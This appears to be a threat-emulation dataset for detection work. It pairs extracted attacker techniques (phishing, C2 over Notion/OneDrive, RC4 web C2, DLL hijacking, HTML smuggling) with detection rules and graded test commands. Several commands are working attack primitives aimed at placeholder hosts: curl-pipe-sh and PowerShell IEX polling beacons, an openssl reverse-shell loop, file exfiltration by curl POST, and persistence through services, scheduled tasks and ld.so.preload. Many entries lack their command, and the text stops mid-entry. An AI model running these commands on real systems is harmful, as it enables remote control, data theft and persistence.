extracted_ttps.description: The attacker uses phishing emails with malicious links to deliver malware, such as QuarterRig, to the victim's computer.

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: The attacker uses the command and control channel to exfiltrate data from the victim's system, using services such as Notion and OneDrive.
The attacker uses compromised websites and legitimate services, such as Notion and OneDrive, to communicate with the malware and exfiltrate data.
The attacker uses user execution to load malware, such as GraphicalProton, onto the victim's computer via ISO or ZIP files.
The detected tools 'cmd' and 'net' indicate the use of command and scripting interpreters, which can be used to execute malicious commands or scripts.
The attacker used web protocols to establish command and control with the victim's system. The communication was encrypted using RC4 encryption.
The detected malware 'Beacon' and 'conti' may be executed by users, either intentionally or unintentionally, which can lead to malicious activity.
The attacker used a malicious file to gain execution on the victim's system. The file was delivered via a PHP webpage and was disguised as a legitimate file.
The attacker uses malware, such as GraphicalNeutrino, to modify the registry and maintain persistence on the victim's system.
The detected tool 'netstat' can be used for remote system discovery, which allows attackers to gather information about the network and systems.
The attacker used a web service to establish bidirectional communication with the victim's system. The communication was used to send and receive commands.

extracted_ttps.technique_name: Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder
extracted_ttps.description: The attacker used a registry run key to establish persistence on the victim's system. The key was used to execute a malicious executable.
The attacker compromised infrastructure to deliver malware to the victim's system. The infrastructure included domains and IP addresses.
The attacker used the command 'whoami' to discover the system owner/user. The command was executed via cmd.exe.
The attacker potentially used command line tools like cmd, net, and netstat for malicious activities

extracted_ttps.technique_name: Hijack Execution Flow: DLL Search Order Hijacking
extracted_ttps.description: The attacker used DLL search order hijacking to load a malicious DLL. The DLL was used to evade detection and establish persistence.

extracted_ttps.technique_name: Obfuscated Files or Information: HTML Smuggling
extracted_ttps.description: The attacker used HTML smuggling to deliver a malicious file to the victim's system. The file was obfuscated to evade detection.

Detected use of netstat, a tool for discovering system network configuration
The attacker potentially used Windows Management Instrumentation for system discovery

rules.title: Phishing Payload Execution via Office Applications
rules.description: Detects execution of PowerShell, cmd, mshta, or rundll32 launched from Outlook, Word, or Excel with command lines indicating download of malicious content or use of encoded scripts, and direct execution of files containing the name QuarterRig.

detection.condition: selection_office_ps or selection_office_ps_enc or selection_office_mshta or selection_rundll32_enc or selection_quarterrig

falsepositives: Legitimate Office macros that invoke PowerShell for automation
IT administration scripts that use mshta or rundll32 for internal tools
User‑initiated PowerShell sessions launched from Outlook via add‑ins

rules.title: Detect PowerShell Use of Notion or OneDrive for Potential C2

falsepositives: Legitimate PowerShell scripts that interact with Notion or OneDrive APIs for automation or backup purposes.
System administrators using PowerShell to manage OneDrive files.

falsepositives: User legitimately opening ZIP or ISO files from trusted sources
Software installation from legitimate disk images or archives

rules.title: Use of RC4-Encrypted Web Protocol for Command and Control
rules.description: Detects use of RC4 encryption in web protocol communications, commonly associated with command and control activity. This rule identifies network connections using RC4 cipher initiated by processes often abused in post-compromise scenarios.
falsepositives: Legacy internal applications or services that still use RC4 for TLS encryption
Administrative scripts using certutil or PowerShell with RC4 for internal transfers (rare)
Older software updates or patch management tools on isolated networks

rules.title: Execution of Malicious ISO File Delivered via PHP Webpage
rules.description: Detects execution of a malicious ISO file (Note.iso) delivered from a known malicious PHP page (te-as[.]no/wine[.]php). This behavior is consistent with user execution following phishing or malicious web content.

detection.condition: (selection_domain or selection_iso) and selection_execution and parent_process

falsepositives: Legitimate use of mounting and executing software from ISO images downloaded from trusted sources
Administrative scripts that reference similar filenames or domains coincidentally

attacks.description: Simulates a user clicking a phishing email link that opens a malicious URL in the default web browser.
attacks.expected_behavior: The default web browser launches and navigates to the specified URL.

attacks.description: Uses certutil to download a payload (simulated as qrig.exe) to the temporary folder and executes it, a common post‑phishing delivery method.
attacks.expected_behavior: The file is saved to %TEMP%\qrig.exe and then launched, resulting in the payload executing.

attacks.description: Advanced stealthy PowerShell one‑liner that silently downloads the payload via WebClient and runs it hidden, emulating an encoded phishing delivery.
attacks.expected_behavior: The payload is downloaded to the temporary directory and executed without showing a window, mimicking a covert post‑phishing execution.

attacks.command: echo -e "Subject: Important Update\n\nPlease review the following link: http://malicious.example.com/quarterrig.sh" | sendmail victim@example.com
attacks.description: Sends a plain‑text phishing email using sendmail with a malicious link in the body.
attacks.expected_behavior: The email is delivered to victim@example.com containing the link to the simulated malicious payload.

attacks.command:
printf "Subject: Action Required MIME-Version: 1.0 Content-Type: text/html; charset=UTF-8

Please update your software by clicking here.

" | mail -a /dev/null -s "Action Required" victim@example.com
attacks.description: Uses the mail command to send an HTML phishing email with a clickable link and a harmless attachment placeholder.
attacks.expected_behavior: An HTML email arrives in the victim's inbox with a clickable link to the placeholder malicious URL and an empty attachment.

attacks.command:
echo "Subject: Security Notice From: attacker@evil.com To: victim@example.com MIME-Version: 1.0 Content-Type: multipart/alternative; boundary=BOUNDARY --BOUNDARY Content-Type: text/plain; charset=UTF-8 Please update your system: http://malicious.example.com/quarterrig.sh --BOUNDARY Content-Type: text/html; charset=UTF-8

Urgent: click here to install the critical update.

--BOUNDARY--" > /tmp/phish.eml && mutt -s "Security Notice" -i /tmp/phish.eml victim@example.com
attacks.description: Creates a multipart MIME email file with both plain‑text and HTML parts containing a malicious link, then sends it via mutt.
attacks.expected_behavior: The victim receives a multipart email with both plain‑text and HTML representations, each containing the simulated malicious link.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Read a test file, Base64‑encode its contents, and POST the data to a remote C2 URL using Invoke-WebRequest.
attacks.expected_behavior: The command retrieves the file from %TEMP%\testdata.txt, encodes it, and sends an HTTP POST request to https://example.com/c2. No elevation is required.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Compress the test file into a ZIP archive and upload the archive to a remote server using BITS (bitsadmin).
attacks.expected_behavior: Creates %TEMP%\data.zip containing the test file, then initiates a BITS transfer that uploads the ZIP to https://example.com/upload. The operation runs without admin rights.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Split the file into 1 KB chunks, Base64‑encode each chunk, and exfiltrate each chunk via separate HTTP GET requests to a C2 endpoint.
attacks.expected_behavior: The command reads the test file, divides it into small pieces, encodes each piece, and issues a series of GET requests to https://example.com/collect with the data in the query string. This mimics a low‑and‑slow exfiltration technique and does not require elevated privileges.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: cat /tmp/secret.txt | curl -s -X POST -H "Authorization: Bearer TEST_TOKEN" -H "Content-Type: text/plain" --data-binary @- https://example.com/api/upload
attacks.description: Basic exfiltration: reads a test file and streams its contents via an HTTP POST to a mock C2 endpoint (simulating a Notion or OneDrive API).
attacks.expected_behavior: The file /tmp/secret.txt is sent to the remote URL; curl returns the HTTP response code (silently) and exits without creating new files on the host.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: tar -czf /tmp/data_bundle.tar.gz -C /tmp secret.txt && curl -s -X POST -H "Authorization: Bearer TEST_TOKEN" -F "file=@/tmp/data_bundle.tar.gz" https://example.com/api/upload
attacks.description: Intermediate exfiltration: compresses the target file into a tar.gz archive before uploading, reducing size and evading simple content inspection.
attacks.expected_behavior: Creates /tmp/data_bundle.tar.gz, then posts it as a multipart/form‑data field to the remote endpoint. The archive remains in /tmp after upload for cleanup.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Advanced exfiltration: uses an existing SSH session (common C2 channel) to copy the file directly to the attacker‑controlled server, mimicking OneDrive sync via SSH.
attacks.expected_behavior: The file is transferred over the SSH channel to the remote host's /var/exfil directory. No new processes beyond scp are spawned.

attacks.description: Basic enumeration of processes with their window titles using the built‑in tasklist utility, filtered for Notepad to demonstrate window discovery.
attacks.expected_behavior: Outputs CSV lines for any Notepad processes, including the 'Window Title' column that shows the title of the Notepad window.

attacks.command: powershell -Command "Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object Id, ProcessName, MainWindowTitle"
attacks.description: Intermediate PowerShell command that lists all processes that have an associated GUI window, showing PID, process name, and window title.
attacks.expected_behavior: Displays a table of processes with non‑empty MainWindowTitle, effectively revealing open application windows on the system.

attacks.description: Advanced enumeration using the Shell.Application COM object to iterate over all Explorer/IE style windows and output their URLs and document titles.
attacks.expected_behavior: Prints the location URL and title for each open shell window (e.g., File Explorer folders, Internet Explorer tabs), providing detailed window discovery information.

attacks.description: Lists all X11 windows in tree format
attacks.expected_behavior: Displays hierarchical tree of all X Window System windows belonging to the root window

attacks.description: Lists window titles and IDs using wmctrl
attacks.expected_behavior: Outputs list of active windows with window IDs and titles

attacks.description: Encodes window list and simulates exfiltration to Notion API
attacks.expected_behavior: Base64-encodes window list and sends POST request to dummy Notion endpoint (simulated exfiltration)

attacks.description: Mounts an ISO file from TEMP and executes setup.bat from the mounted drive
attacks.expected_behavior: Mounts the ISO image, locates the drive letter, and launches setup.bat from the mounted volume

attacks.description: Extracts a ZIP file to TEMP and executes a VBScript from the extracted directory
attacks.expected_behavior: Extracts the ZIP contents and runs the loader.vbs script, simulating execution of extracted payload

attacks.description: Extracts a ZIP containing a Base64-encoded payload, decodes it using certutil, and executes the resulting executable
attacks.expected_behavior: Decodes the Base64-encoded payload into an executable and runs it, demonstrating payload execution from user-extracted files

attacks.command: sudo mkdir -p /mnt/mal_iso && curl -sSL http://example.test/test.iso -o /tmp/test.iso && sudo mount /tmp/test.iso /mnt/mal_iso && /mnt/mal_iso/payload.sh && sudo umount /mnt/mal_iso && rm /tmp/test.iso
attacks.description: Intermediate user execution involving mounting a downloaded ISO with admin privileges
attacks.expected_behavior: Mounts ISO, executes payload.sh (assumed benign), then cleans up

attacks.command: mkdir -p /tmp/iso_content && echo 'echo "Advanced user execution test" > /tmp/result_advanced.txt' > /tmp/iso_content/.hidden_script.sh && chmod +x /tmp/iso_content/.hidden_script.sh && mkisofs -o /tmp/advanced.iso /tmp/iso_content 2>/dev/null && sudo mount /tmp/advanced.iso /mnt 2>/dev/null && /mnt/.hidden_script.sh && sudo umount /mnt && rm /tmp/advanced.iso
attacks.description: Advanced execution using a locally generated ISO with a hidden script, requiring admin for mounting
attacks.expected_behavior: Creates ISO with hidden script, mounts it, executes script to create /tmp/result_advanced.txt

attacks.description: Basic use of cmd.exe to execute an echo command and write output to a temporary file.
attacks.expected_behavior: Creates a file named hello.txt in the %TEMP% directory containing the text 'HelloWorld'.

attacks.command: net user DemoUser DemoPass! /add && net localgroup "Users" DemoUser /add
attacks.description: Intermediate use of net.exe to create a local user account and add it to the Users group.
attacks.expected_behavior: Adds a new local user named DemoUser with password DemoPass! and includes it in the Users group. The command will fail if not run with elevated privileges.

attacks.command: sc create DummyService binPath= "cmd.exe /c \"echo ServiceRunning > %TEMP%\\service.log\"" && sc start DummyService && sc delete DummyService
attacks.description: Advanced use of sc.exe to create a temporary service that runs a cmd command, starts it, then removes the service.
attacks.expected_behavior: Creates a service named DummyService that executes a cmd.exe command writing 'ServiceRunning' to %TEMP%\service.log, starts the service, and finally deletes the service. The temporary log file is left on disk.

attacks.description: Basic use of the Bash interpreter to run a simple echo command.
attacks.expected_behavior: Prints the string 'Hello, world!' to standard output.

attacks.command:
cat > /tmp/test_script.sh <<'EOF'
#!/bin/bash
echo "Script execution test"
uname -a
EOF
chmod +x /tmp/test_script.sh && /tmp/test_script.sh
attacks.description: Intermediate example that writes a temporary Bash script to /tmp, makes it executable, and runs it via the interpreter.
attacks.expected_behavior: Creates a script that prints a test message and displays kernel information, then executes the script, outputting both lines.

attacks.description: Advanced use of Bash to decode a base64‑encoded command (the 'date' command) and execute it via the interpreter.
attacks.expected_behavior: Decodes the string 'date' and runs it, printing the current system date and time.

attacks.description: Downloads an RC4‑encrypted payload over HTTP using certutil and immediately executes it.
attacks.expected_behavior: A GET request is sent to http://example.com/c2/rc4payload.bin; the file is saved to the TEMP directory and launched, creating a new process.

attacks.description: Uses bitsadmin to fetch an RC4‑encrypted payload via HTTP and runs it, demonstrating a different native Windows binary for web‑based C2.
attacks.expected_behavior: BITS creates a background transfer to download the payload; after completion the file is executed, generating outbound HTTP traffic and a new process.

attacks.command: powershell -Command "$url='http://example.com/c2/command'; while($true){ $enc=Invoke-WebRequest -Uri $url -UseBasicParsing -Method GET -TimeoutSec 10 | Select-Object -ExpandProperty Content; if($enc){ $key='s3cr3tK3y'; $bytes=[Convert]::FromBase64String($enc); $rc4=[System.Security.Cryptography.RC4CryptoServiceProvider]::new(); $rc4.Key=[Text.Encoding]::ASCII.GetBytes($key); $rc4.Mode='ECB'; $dec=$rc4.CreateDecryptor().TransformFinalBlock($bytes,0,$bytes.Length); $cmd=[Text.Encoding]::ASCII.GetString($dec); Invoke-Expression $cmd; }; Start-Sleep -Seconds 30 }"
attacks.description: Establishes a persistent C2 loop that polls a remote HTTP endpoint for RC4‑encrypted commands, decrypts them in‑memory, and executes them.
attacks.expected_behavior: The script repeatedly issues HTTP GET requests to the C2 server, receives Base64‑encoded RC4 ciphertext, decrypts it using the hard‑coded key, and runs the resulting command, providing continuous web‑based C2 capability.

attacks.description: Basic C2 fetch: retrieves an RC4‑encrypted command from a web server and decrypts it locally.
attacks.expected_behavior: The command contacts http://example.com/c2, receives encrypted data, decrypts it with the provided RC4 key, and outputs the plaintext to the console.

attacks.command: while true; do echo "PING" | openssl rc4 -K 0123456789abcdef -nosalt | curl -s -X POST -d @- http://example.com/beacon; sleep 30; done
attacks.description: Intermediate beacon: periodically sends an RC4‑encrypted heartbeat to a C2 server over HTTP.
attacks.expected_behavior: Every 30 seconds the script encrypts the string "PING" with RC4 and POSTs it to http://example.com/beacon. No data is written to disk.

attacks.description: Advanced persistent C2: establishes a TLS connection to the C2 server using the RC4 cipher suite, providing an encrypted channel for bidirectional communication.
attacks.expected_behavior: Opens a background TLS session to example.com on port 443, negotiating RC4 as the cipher. The session can be used to send and receive further commands over the encrypted channel.

attacks.description: Copies a legitimate system executable (calc.exe) to a new name that appears as an update file and then runs it, mimicking a malicious file disguised as a legitimate update.
attacks.expected_behavior: Calculator launches, demonstrating that the copied file was executed by the user.

attacks.description: Creates a base64‑encoded batch script, decodes it with certutil to a .bat file, and executes it, representing a malicious file delivered via encoded content.
attacks.expected_behavior: The batch file runs and prints 'hello world' to the console, showing that the decoded file was executed.

attacks.description: Writes a malicious HTA file that uses ActiveX to launch calc.exe and then runs it with mshta.exe, demonstrating an advanced user‑execution vector via HTML Applications.
attacks.expected_behavior: Calculator launches as a result of the HTA execution, indicating successful user execution of the malicious file.

attacks.description: Downloads a script disguised as a legitimate file from a local PHP page and executes it as the current user.
attacks.expected_behavior: The script runs and prints a benign message (e.g., 'Hello from malicious.sh'), demonstrating user‑initiated execution of a downloaded file.

attacks.description: Retrieves a base64‑encoded malicious script via a PHP endpoint, decodes it to a shell script, and executes it.
attacks.expected_behavior: The decoded script runs, outputting a harmless message (e.g., 'Payload executed'), showing that the attacker can hide malicious code in encoded form before user execution.

attacks.description: Downloads a malicious ELF binary from a PHP page, sets the setuid root bit, and executes it to gain elevated privileges.
attacks.expected_behavior: When executed, the binary runs with root privileges (simulated by printing 'Running as root'), illustrating a user‑executed file that escalates privileges.

attacks.description: Adds a Run key under the current user hive to launch notepad.exe at logon, providing persistence without requiring elevated privileges.
attacks.expected_behavior: A new registry value named 'TestPersistence' is created; notepad.exe will start automatically when the user logs in.

attacks.description: Adds a Run key under the local machine hive to launch calc.exe at system startup, requiring administrative rights for persistence across all users.
attacks.expected_behavior: A new registry value named 'TestPersistenceAdmin' is created; calc.exe will start automatically for every user when the system boots.

attacks.command: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe\Debugger" /d "notepad.exe" /f
attacks.description: Sets a debugger for calc.exe via Image File Execution Options, causing notepad.exe to launch whenever calc.exe is executed, a stealthy persistence mechanism.
attacks.expected_behavior: A 'Debugger' value is added; attempting to run calc.exe will instead launch notepad.exe, demonstrating registry-based execution hijacking.

attacks.description: Appends a malicious directory to the user's PATH in their Bash profile to achieve persistence across new shell sessions.
attacks.expected_behavior: When the user opens a new terminal, the PATH variable includes /tmp/malicious, allowing execution of malicious binaries placed there.

attacks.description: Modifies the SSH daemon configuration to permit root login, providing a persistent remote access vector.
attacks.expected_behavior: The SSH service restarts with PermitRootLogin enabled, allowing root logins via SSH for future sessions.

attacks.command:
sudo bash -c 'cat > /etc/systemd/system/malicious.service <<'"'EOF'"'
[Unit]
Description=Malicious Persistence Service
After=network.target

[Service]
ExecStart=/usr/bin/env bash -c "echo Hello > /tmp/persistence.log"
Restart=always

[Install]
WantedBy=multi-user.target
EOF
' && sudo systemctl daemon-reload && sudo systemctl enable malicious.service && sudo systemctl start malicious.service
attacks.description: Creates a systemd service that runs at boot, writing a marker file to demonstrate persistence.
attacks.expected_behavior: The service is installed, enabled, and started; on each boot it executes the command, creating /tmp/persistence.log.

attacks.description: Lists all active network connections and listening ports, including remote IP addresses.
attacks.expected_behavior: Displays a list of TCP/UDP connections with remote addresses, ports, and owning process IDs.

attacks.description: Lists computers in the current domain or workgroup for network discovery.
attacks.expected_behavior: Outputs a list of networked computers visible to the current user/domain.

attacks.description: Lists active sessions on the system (admin required).
attacks.expected_behavior: Displays active network sessions to the local computer, including client names and connection times.

attacks.description: Basic TCP connection enumeration without DNS resolution
attacks.expected_behavior: Lists all active TCP connections (LISTEN/ESTABLISHED) showing remote IP:port pairs

attacks.description: Intermediate filtering of established TCP connections
attacks.expected_behavior: Displays only established TCP connections to identify active remote systems

attacks.description: Advanced TCP connection enumeration with process IDs (requires root)
attacks.expected_behavior: Shows TCP connections with associated processes, revealing which services communicate with remote systems

attacks.description: Fetches a PowerShell command from a web service, executes it, and sends a simple status POST back to the server.
attacks.expected_behavior: The command contacts http://example.com/getcmd, runs any returned PowerShell code, then posts 'status=done' to http://example.com/post.

attacks.command: echo "$url='http://example.com/command'; while(\$true){\$r=Invoke-WebRequest -Uri \$url -UseBasicParsing; if(\$r.Content){IEX \$r.Content}; Start-Sleep -Seconds 30}" > %TEMP%\beacon.ps1 && schtasks /Create /SC MINUTE /MO 5 /TN "BeaconTask" /TR "powershell -ExecutionPolicy Bypass -File \"%TEMP%\\beacon.ps1\"" /RL HIGHEST /F
attacks.description: Writes a PowerShell polling script to %TEMP% and registers a scheduled task that runs it every 5 minutes, enabling periodic bidirectional communication with the web service.
attacks.expected_behavior: The script repeatedly requests http://example.com/command, executes any received code, and sleeps 30 seconds between polls. The scheduled task ensures the script runs persistently.

attacks.command: sc create BeaconService binPath= "powershell -NoProfile -WindowStyle Hidden -Command \"while(\$true){\$c=Invoke-WebRequest -Uri 'http://example.com/poll' -UseBasicParsing; if(\$c.Content){IEX \$c.Content}; Start-Sleep -Seconds 10}\"" start= auto obj= LocalSystem
attacks.description: Creates a Windows service that runs a continuous PowerShell loop contacting a web endpoint for commands and executing them, providing persistent bidirectional communication.
attacks.expected_behavior: The service starts automatically, continuously polls http://example.com/poll, executes any returned PowerShell code, and repeats every 10 seconds.

attacks.command: while true; do curl -s http://example.com/getcmd | sh; sleep 5; done
attacks.description: Basic polling of command server via HTTP every 5 seconds
attacks.expected_behavior: Repeatedly fetches commands from example.com and executes them via shell. Sends no output back.

attacks.command: mkfifo /tmp/pipe; curl -s -X POST --data-binary @/tmp/pipe http://example.com/c2 & while true; do curl -s http://example.com/cmd > /tmp/pipe; sleep 3; done
attacks.description: Intermediate bidirectional comms using named pipe
attacks.expected_behavior: Creates FIFO pipe for continuous command exchange. Background process sends pipe contents to server while foreground fetches new commands.

attacks.command: openssl s_client -quiet -connect example.com:443 2>/dev/null | while read cmd; do eval "$cmd" | openssl s_client -quiet -connect example.com:443; done
attacks.description: Advanced encrypted bidirectional communication via OpenSSL
attacks.expected_behavior: Establishes TLS-encrypted channel to example.com, executes received commands and sends output back through same encrypted pipe.

attacks.technique_name: Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder
attacks.description: Adds a Run key in the current user's registry hive that launches Notepad on logon.
attacks.expected_behavior: When the user logs on again, Notepad.exe will be automatically started.

attacks.technique_name: Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder
attacks.description: Adds a Run key in the local machine hive that launches Calculator for all users on logon.
attacks.expected_behavior: On the next logon of any user, Calculator.exe will be automatically started.

attacks.technique_name: Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder
attacks.description: Creates a shortcut to Calculator in the current user's Startup folder, causing it to run at logon.
attacks.expected_behavior: A .lnk file named Calc.lnk is placed in the user's Startup directory; Calculator will launch automatically the next time the user logs on.

attacks.technique_name: Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder
attacks.description: Create a per‑user autostart .desktop file that runs a benign script at login.
attacks.expected_behavior: On the next graphical login, the desktop environment will execute $HOME/.local/bin/malicious.sh as defined in the .desktop file.

attacks.technique_name: Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder
attacks.command:
sudo mkdir -p /etc/xdg/autostart && sudo cp "$HOME/.local/bin/malicious.sh" /usr/local/bin/malicious.sh && sudo chmod +x /usr/local/bin/malicious.sh && sudo printf '[Desktop Entry]
Type=Application
Exec=/usr/local/bin/malicious.sh
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=Updater
Comment=System Updater
' > /etc/xdg/autostart/malicious.desktop
attacks.description: Install a system‑wide autostart entry that runs a script for all users; requires root privileges.
attacks.expected_behavior: Every user who logs into a graphical session will have /usr/local/bin/malicious.sh executed automatically via the system .desktop file.

attacks.technique_name: Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder
attacks.command:
mkdir -p "$HOME/.config/autostart" && echo -e '#!/bin/bash
echo "Persistence test" >> "$HOME/persistence.log"' > "$HOME/.local/bin/malicious.sh" && chmod +x "$HOME/.local/bin/malicious.sh" && printf '[Desktop Entry]
Type=Application
Exec=$HOME/.local/bin/malicious.sh
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=UpdateChecker
Comment=Checks for updates
' > "$HOME/.config/autostart/malicious.desktop"
attacks.description: Create the payload script, make it executable, and register it in the user's autostart folder; demonstrates a full end‑to‑end persistence setup without requiring elevated rights.
attacks.expected_behavior: When the user logs in, the script writes a line to $HOME/persistence.log, confirming that the autostart entry was executed.

attacks.description: Basic DNS query to verify that the attacker controls the malicious domain.
attacks.expected_behavior: Displays DNS resolution information for malicious.example.com; no changes to the system.

attacks.description: Downloads a (benign placeholder) file from a malicious-controlled URL into the temporary directory, simulating payload staging on compromised infrastructure.
attacks.expected_behavior: Creates %TEMP%\payload.exe containing the downloaded content; logs the download in the certutil output.

attacks.description: Appends a hosts file entry mapping the malicious domain to an attacker‑controlled IP address, demonstrating control over delivery infrastructure.
attacks.expected_behavior: Adds a line to the hosts file; subsequent DNS queries for malicious.example.com resolve to 192.0.2.123.

attacks.description: Downloads a benign file to web server directory to simulate hosting malicious content
attacks.expected_behavior: File is placed in web server directory, simulating infrastructure compromise to host malware for distribution.

attacks.description: Adds cron job to periodically download payload from attacker infrastructure
attacks.expected_behavior: Creates persistent scheduled download from compromised infrastructure to maintain payload freshness.

attacks.command: sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 && nc -l -p 8080
attacks.description: Redirects web traffic to malicious listener port for C2 communication
attacks.expected_behavior: Network traffic manipulation demonstrates infrastructure compromise for command-and-control operations.

attacks.description: Basic current user discovery using built-in utility
attacks.expected_behavior: Displays current username in plain text

attacks.description: Intermediate user/group context discovery
attacks.expected_behavior: Shows detailed user information including SID, privileges, and groups

attacks.description: Advanced user extraction from workstation configuration
attacks.expected_behavior: Outputs workstation configuration line containing current user name

attacks.description: Basic user discovery using whoami
attacks.expected_behavior: Outputs current username to terminal

attacks.description: Intermediate user/group discovery with id utility
attacks.expected_behavior: Displays current user UID, GID, and group memberships

attacks.description: Advanced multi-method user discovery
attacks.expected_behavior: Shows username via whoami, detailed identity via id, and shell variable via echo

attacks.technique_name: Hijack Execution Flow: DLL Search Order Hijacking
attacks.description: Basic DLL hijack: copies a legitimate system DLL to a temporary directory and prepends that directory to the PATH so future loads of winhttp.dll resolve to the copied file first.
attacks.expected_behavior: The DLL is placed in a location that appears earlier in the DLL search order. Any process that loads winhttp.dll without a full path will load the copied version, demonstrating hijack behavior.

attacks.technique_name: Hijack Execution Flow: DLL Search Order Hijacking
attacks.command: cmd.exe /c "mkdir \"%TEMP%\\HijackTest\" 2>nul && echo RHVtbXlETEx > \"%TEMP%\\dummy.b64\" && certutil -decode \"%TEMP%\\dummy.b64\" \"%TEMP%\\HijackTest\\winhttp.dll\" >nul && del \"%TEMP%\\dummy.b64\" && set \"PATH=%TEMP%\\HijackTest;%PATH%\""
attacks.description: Intermediate hijack: creates a dummy DLL from a base64 string using certutil, stores it in the hijack directory, and updates PATH to prioritize that directory.
attacks.expected_behavior: A benign DLL file named winhttp.dll is generated in the hijack folder. When a process searches for winhttp.dll, the DLL in the PATH‑prepended folder is found first, achieving hijack.

attacks.technique_name: Hijack Execution Flow: DLL Search Order Hijacking
attacks.command: cmd.exe /c "mkdir \"%TEMP%\\HijackTest\" 2>nul && copy \"%SystemRoot%\\System32\\winhttp.dll\" \"%TEMP%\\HijackTest\\winhttp.dll\" /Y && reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\vulnerable.exe\" /v Path /t REG_SZ /d \"%TEMP%\\HijackTest\" /f"
attacks.description: Advanced hijack: copies a system DLL to a controlled directory and registers that directory as the search path for a target executable via the HKLM App Paths registry key.
attacks.expected_behavior: When 'vulnerable.exe' is launched, Windows will include the hijack directory in its DLL search order, causing the copied winhttp.dll to be loaded instead of the legitimate one.

attacks.technique_name: Hijack Execution Flow: DLL Search Order Hijacking
attacks.description: Basic LD_PRELOAD hijack: copies libc to a temporary location and preloads it when running ls, demonstrating library search order manipulation.
attacks.expected_behavior: The ls command runs while the copied libc is loaded before the system libc; no visible change but confirms the hijack mechanism.

attacks.technique_name: Hijack Execution Flow: DLL Search Order Hijacking
attacks.command: mkdir -p $HOME/.local/lib && cp /usr/lib/x86_64-linux-gnu/libssl.so.1.1 $HOME/.local/lib/libssl.so.1.1 && chmod +x $HOME/.local/lib/libssl.so.1.1 && LD_LIBRARY_PATH=$HOME/.local/lib openssl version
attacks.description: Intermediate hijack using LD_LIBRARY_PATH: places a copy of libssl in a user‑controlled directory and forces openssl to load it first.
attacks.expected_behavior: Openssl loads the library from $HOME/.local/lib before the system library, demonstrating a search order hijack without needing root.

attacks.technique_name: Hijack Execution Flow: DLL Search Order Hijacking
attacks.command: printf '\x7fELF\x02\x01\x01' > /tmp/malicious.so && chmod 644 /tmp/malicious.so && echo "/tmp/malicious.so" | sudo tee /etc/ld.so.preload > /dev/null && sudo ldconfig
attacks.description: Advanced persistent hijack: creates a dummy ELF shared object and adds its path to /etc/ld.so.preload, causing it to be loaded by all processes.
attacks.expected_behavior: The system-wide preload file is updated; subsequent binaries will load /tmp/malicious.so before any other libraries, achieving persistence.

attacks.technique_name: Obfuscated Files or Information: HTML Smuggling
attacks.command: powershell -Command "$path = \"$env:TEMP\\hello.txt\"; $html = \"<html><body><script>var b='SGVsbG8gV29ybGQh';var data=atob(b);var fso=new ActiveXObject('Scripting.FileSystemObject');var f=fso.CreateTextFile('$path',true);f.Write(data);f.Close();</script></body></html>\"; Set-Content -Path \"$env:TEMP\\smuggle.html\" -Value $html -Encoding ASCII; Start-Process mshta.exe -ArgumentList \"$env:TEMP\\smuggle.html\""
attacks.description: Create a simple HTML file with a Base64‑encoded string, decode it via JavaScript, write the result to a text file, and launch the HTML using mshta.exe.
attacks.expected_behavior: An HTML file is written to %TEMP%/smuggle.html. When mshta.exe runs it, the script decodes "Hello World" and creates %TEMP%/hello.txt containing that text.

attacks.technique_name: Obfuscated Files or Information: HTML Smuggling
attacks.command: powershell -Command "$payloadPath = \"$env:TEMP\\payload.txt\"; Set-Content -Path $payloadPath -Value 'Hello World' -Encoding ASCII; certutil -encode $payloadPath \"$env:TEMP\\payload.b64\" > $null; $b64 = (Get-Content \"$env:TEMP\\payload.b64\" | Select-Object -Skip 1 | Where-Object {\$_ -ne ''}) -join ''; $html = \"<html><body><script>var b='$b64';var data=atob(b);var fso=new ActiveXObject('Scripting.FileSystemObject');var f=fso.CreateTextFile('$env:TEMP\\decoded.txt',true);f.Write(data);f.Close();</script></body></html>\"; Set-Content -Path \"$env:TEMP\\smuggle2.html\" -Value $html -Encoding ASCII; Start-Process mshta.exe -ArgumentList \"$env:TEMP\\smuggle2.html\""
attacks.description: Encode a payload file with certutil, embed the resulting Base64 data in HTML, decode via JavaScript, write to a new file, and execute the HTML with mshta.exe.
attacks.expected_behavior: Creates payload.txt with "Hello World", encodes it to payload.b64, builds smuggle2.html that decodes the data and writes %TEMP%/decoded.txt containing the original text, then launches the HTML.

attacks.technique_name: Obfuscated Files or Information: HTML Smuggling
attacks.command: powershell -Command "$path = \"$env:TEMP\\secret.txt\"; $js = \"var b='SGVsbG8gV29ybGQh';var d=atob(b);var fso=new ActiveXObject('Scripting.FileSystemObject');var f=fso.CreateTextFile('$path',true);f.Write(d);f.Close();\"; $obf = ($js.ToCharArray() | ForEach-Object { [int][char]$_ }) -join ','; $html = \"<html><body><script>eval(String.fromCharCode($obf));</script></body></html>\"; Set-Content -Path \"$env:TEMP\\smuggle3.html\" -Value $html -Encoding ASCII; Start-Process mshta.exe -ArgumentList \"$env:TEMP\\smuggle3.html\""
attacks.description: Obfuscate the JavaScript payload by converting each character to its ASCII code, reconstruct it at runtime with eval(String.fromCharCode(...)), decode a Base64 string, write the result to a file, and launch via mshta.exe.
attacks.expected_behavior: Writes smuggle3.html containing obfuscated JavaScript. When executed, the script rebuilds the original JavaScript, decodes "Hello World", and creates %TEMP%/secret.txt with that content.

attacks.technique_name: Obfuscated Files or Information: HTML Smuggling
